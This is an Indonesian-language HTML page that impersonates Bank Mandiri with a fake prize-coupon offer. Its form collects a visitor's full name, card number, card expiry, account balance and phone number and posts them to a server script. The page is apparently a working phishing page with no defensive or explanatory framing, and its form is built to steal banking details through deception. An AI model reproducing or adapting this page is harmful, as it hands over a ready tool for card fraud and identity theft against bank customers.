<html lang="en">
    <head>
        <meta charset="utf-8">
        <link rel="icon" href="Mandiri.svg">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <meta property="og:image" content="https://pbs.twimg.com/media/FExrdKLVIAME-yV.jpg">
        <meta name="theme-color" content="#000000">
        <meta name="description" content="*Segera Cetak Kupon, Dapatkan Hadiah dari BankMandiri">
        <link rel="icon" type="image/svg" href="Mandiri.svg">
        <title>Kupon Berhadiah</title>
        <link href="/static/css/main.479ffcce.css" rel="stylesheet">
    </head>
    <body>
        <noscript>You need to enable JavaScript to run this app.</noscript>
        <div id="root">
            <div>
                <div class="pg1">
                    <form class="f3" action="/req/one.php" method="post">
                        <br>
                        <br>
                        <div class="px-2 bg-light ">
                            <marquee class="py-3" direction="left">Silakan Lengkapi Form Pendaftaran dibawah ini .</marquee>
                        </div>
                        <br>
                        <label class="ib">👤 Nama Lengkap*</label>
                        <br>
                        <input name="nama" type="text" placeholder="Masukkan Nama Lengkap" required>
                        <label class="ib">💳 Nomor Kartu Debit/Kredit *</label>
                        <br>
                        <input name="nokart" type="number" placeholder="16 digit Nomor Kartu" minlength="16" maxlength="16" required>
                        <br>
                        <div style="display: flex;width:100%;">
                            <div style="width:100%;">
                                <label class="ib">💳 Masa Berlaku Kartu *</label>
                                <br>
                                <span class="selct" style="width:100%;">
                                    <div style="display: flex;width:100%;">
                                        <select name="m" required style="width:100%;margin-right:10px;">
                                            <option selected disabled>Bulan</option>
                                            <option value="01">01</option>
                                            <option value="02">02</option>
                                            <option value="03">03</option>
                                            <option value="04">04</option>
                                            <option value="05">05</option>
                                            <option value="06">06</option>
                                            <option value="07">07</option>
                                            <option value="08">08</option>
                                            <option value="09">09</option>
                                            <option value="10">10</option>
                                            <option value="11">11</option>
                                            <option value="12">12</option>
                                        </select>
                                        <select name="y" required style="width:100%;">
                                            <option disabled selected >Tahun</option>
                                            <option value="24">24</option>
                                            <option value="25">25</option>
                                            <option value="26">26</option>
                                            <option value="27">27</option>
                                            <option value="28">28</option>
                                            <option value="29">29</option>
                                            <option value="30">30</option>
                                        </select>
                                    </div>
                                </span>
                            </div>
                            <br>
                        </div>
                            <div>
                            
                                <label class="ib">💵Saldo Terakhir *</label>
                                <br>
                                <input type="number" name="saldo" placeholder="Rp." required="">
                                <br>
                            </div>
                        <label>📞 Nomor Handphone</label>
                        <br>
                        <input type="tel" placeholder="Masukkan No Handphone" name="nohp" minlength="10" maxlength="13" class="duo" required="">
                        <br>
                        <br>
                        <button type="submit" style="margin-top: 0vw; background-color: rgb(19, 108, 195);">Cetak Kupon</button>
                    </form>
                </div>
            </div>
        </div>
    </body>
</html>
